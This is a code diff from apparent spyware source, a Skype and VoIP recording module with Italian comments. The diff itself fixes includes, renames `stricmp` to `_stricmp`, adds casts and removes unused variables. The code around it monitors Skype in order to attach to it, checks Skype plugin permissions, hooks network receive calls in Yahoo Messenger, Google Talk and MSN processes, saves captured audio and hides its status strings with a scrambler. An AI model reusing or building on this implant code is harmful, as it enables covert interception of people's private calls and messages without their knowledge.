@@ -1,15 +1,17 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
 #include <Windows.h>
 #include <json/JSON.h>
-#include "common.h"
-#include "bss.h"
-#include "H4-DLL.h"
-#include "process.h"
-#include "HM_IpcModule.h"
-#include "AM_Core.h"
-#include "demo_functions.h"
-#include "LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/demo_functions.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/process.h"
+#include "../../H4DLL/LOG.h"
 #include <scramblestring.h>
-#include "bin_string.h"
 #include "HM_SkypeRecord.h"
 
 speex_encoder_init_t rel_speex_encoder_init;
@@ -263,8 +265,6 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR* skype_path)
 // Monitora costantemente la possibilita' di attaccarsi come API client a Skype
 DWORD WINAPI MonitorSkypePM(BOOL* semaphore)
 {
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
 	DWORD skipe_id;
 	HANDLE skype_handle;
 	WCHAR skype_path[MAX_PATH];
@@ -846,7 +846,6 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 		QUERY_CANCELLATION(hSkypePMThread, bPM_spmcp);
 	}
 	else { // bStartFlag == TRUE
-		DWORD dummy;
 		// Startiamo il thread che monitora lo skypePM
 		hSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD*)&bPM_spmcp, 0, 0);
 	}
@@ -2291,9 +2290,9 @@ BOOL IsACLPresent(WCHAR* config_path, char* m_key1, char* m_key2, char* m_key3, 
 	HANDLE hMap;
 	DWORD config_size;
 	char* config_map;
-	char* local_config_map, * ptr, * ptr_k;
+	char* local_config_map, * ptr;
 	BOOL acl_found = FALSE;
-	char key1[GENERIC_FIELD_LEN], key2[GENERIC_FIELD_LEN], key3[GENERIC_FIELD_LEN], key4[GENERIC_FIELD_LEN], path[GENERIC_FIELD_LEN];
+	//char key1[GENERIC_FIELD_LEN], key2[GENERIC_FIELD_LEN], key3[GENERIC_FIELD_LEN], key4[GENERIC_FIELD_LEN], path[GENERIC_FIELD_LEN];
 
 	// Mappa in memoria il file di config
 	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
@@ -2619,7 +2618,6 @@ DWORD PM_Recv_setup(HMServiceStruct* pData)
 {
 	char proc_path[DLLNAMELEN];
 	char* proc_name;
-	HMODULE hMod;
 
 	// Verifica autonomamente se si tratta di un programma da hookare
 	ZeroMemory(proc_path, sizeof(proc_path));
@@ -2627,9 +2625,9 @@ DWORD PM_Recv_setup(HMServiceStruct* pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "YahooMessenger.exe") &&
-			stricmp(proc_name, "Googletalk.exe") &&
-			stricmp(proc_name, "msnmsgr.exe"))
+		if (_stricmp(proc_name, "YahooMessenger.exe") &&
+			_stricmp(proc_name, "Googletalk.exe") &&
+			_stricmp(proc_name, "msnmsgr.exe"))
 			return 1; // Hooka solo YahooMessenger, GTalk e MSN
 	}
 	else {
@@ -2739,7 +2737,7 @@ DWORD PM_WSARecv_setup(HMServiceStruct* pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "YahooMessenger.exe"))
+		if (_stricmp(proc_name, "YahooMessenger.exe"))
 			return 1; // Hooka solo YahooMessenger
 	}
 	else {
@@ -2847,8 +2845,8 @@ void SaveEncode(BYTE* source, DWORD total_size, DWORD channels, pVoiceAdditional
 void SaveWav(BYTE* channel_array, DWORD size, DWORD channels, pVoiceAdditionalData additional_data, DWORD additional_len)
 {
 	static BOOL first_save = TRUE;
-	ScrambleString ss1("_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
-	ScrambleString ss2("_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"
+	ScrambleString ss1((char *)"_ yPUvU8WUAUPC 8diUE gEilg......QM\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......OK\r\n\r\n"
+	ScrambleString ss2((char*)"_ yPUvU8WUAUPC 8diUE gEilg......L99Q9\r\n\r\n", shared.is_demo_version); // "- Initializing audio codec......ERROR\r\n\r\n"
 
 	// Verifica che l'array sia stato allocato
 	if (!channel_array)
